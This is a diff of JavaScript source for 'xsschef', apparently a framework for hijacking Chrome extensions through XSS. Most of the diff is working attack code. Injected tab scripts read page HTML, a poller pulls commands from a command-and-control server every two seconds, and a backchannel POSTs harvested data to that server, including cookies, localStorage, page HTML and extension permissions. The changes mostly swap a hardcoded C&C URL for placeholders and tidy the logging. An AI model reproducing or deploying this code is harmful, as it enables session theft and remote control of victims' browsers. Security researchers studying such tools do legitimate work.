@@ -3,13 +3,16 @@
  *
  */
 /*
-todo - chrome.cookies interface
-
+todo:
+ - chrome.cookies interface
+ - websockets
 */
 function __xsschef() {
-    // start scripts
-    // this script gets executed in sheepchannel tab context, it's written here only for syntax highlighting & easy editing
+
+    // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
+    // START scripts
     var sheepchannel_script = function(msg) {
+        /* receive commands from ext and pass the results back */
         switch (msg.cmd) {
             case 'sendhtml':
                 __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML}});
@@ -24,21 +27,22 @@ function __xsschef() {
     }
     
     var backchannel_script = function(msg) {
+        /* receive commands from ext and send the results to c&c */
         switch (msg.cmd) {
             case 'log':
                 var x = new XMLHttpRequest();
-                x.open('POST', 'http://dev.localhost/xsschef/server.php?ch=xxx', true);
+                x.open('POST', '__URL__?ch=__CHANNEL__', true);
                 x.send(JSON.stringify(msg.p));
             break;
         }
     }
 
-    // polling for more commands from c&c server - from page for now
     var c2c_poller_script = function() {
+       /* poll for commands from c&c server and send them to ext */
         setInterval(function() {
             //console.log('polling for cmds');
             var x = new XMLHttpRequest();
-            x.open('GET', 'http://dev.localhost/xsschef/server.php?ch=xxx-cmd', true);
+            x.open('GET', '__URL__?ch=__CMD_CHANNEL__', true);
             x.onreadystatechange = function () {
               if (x.readyState == 4 && x.status == 200) {
                 try {
@@ -54,13 +58,12 @@ function __xsschef() {
         }, 2000);
     }
     
-    // end scripts
+    // END scripts
     
-    
+    // todo: make ext the backchannel itself, if permissions allow
     chrome.permissions.contains({
       origins: ['http://*/*']
     }, function(result) {
-        console.log(result,this);
         if (result) {
             // extension has permissions for XHR on our C&C domain
             // and set a direct log function
@@ -70,18 +73,16 @@ function __xsschef() {
     });
 
     
-    var nolog = function() {};
-    var log = nolog;
+    var log = function() {
+        if (backchannel) {
+            backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
+        }
+    };
+
     var backchannel;
     var sheeps = {};
     
-    var log_to_console = function() {
-        log = function() {
-            console.log(arguments);
-        }
-        init_complete();
-    }
-    
+    // when tab has been created/updated
     chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
         if (changeInfo.status == 'complete') {
             addSheep(tab);
@@ -95,6 +96,7 @@ function __xsschef() {
         }
     });
     
+    // when tab has been removed
     chrome.tabs.onRemoved.addListener(function(tabId, changeInfo) {
         delete sheeps[tabId];
         if (backchannel && backchannel.tab.id == tabId) {
@@ -106,7 +108,8 @@ function __xsschef() {
             report_tabs();
         }
     });
-        
+    
+    // establish sheepchannel
     var addSheep = function(tab) {
         sheeps[tab.id] = tab;
 
@@ -118,9 +121,8 @@ function __xsschef() {
             delete sheeps[tab.id];
         }    
     }
-    
 
-    // setup listener from sheeps
+    // setup listener from sheeps/backchannel
     chrome.extension.onConnect.addListener(function(port) {
         if (port.name == 'backchannel') {
             backchannel = port;
@@ -184,17 +186,6 @@ function __xsschef() {
         setupBackchannel(t.id, init_complete);
     });
     
-    
-    var log_to_backchannel = function() {
-        log = function() {
-            if (backchannel) {
-                backchannel.postMessage({'cmd':'log', 'p': [].slice.call(arguments)});
-            }
-        }
-    }
-    
-    log_to_backchannel();
-    
     var report_tabs = function() {
         log('reporting tabs');
         chrome.tabs.query({}, function(t) {
@@ -220,8 +211,11 @@ function __xsschef() {
 
     var report_ext = function() {
         chrome.permissions.getAll(function(perm) {
-            log({type:'report_ext',result:{'extension': location.href, 'permissions': perm, 'html':document.documentElement.innerHTML,'cookies':document.cookie, 'localStorage': localStorage}});
-        
+            log({type:'report_ext',result:{'extension': location.href,
+                                           'permissions': perm,
+                                           'html':document.documentElement.innerHTML,
+                                           'cookies':document.cookie,
+                                           'localStorage': localStorage}});
         });
     }
     
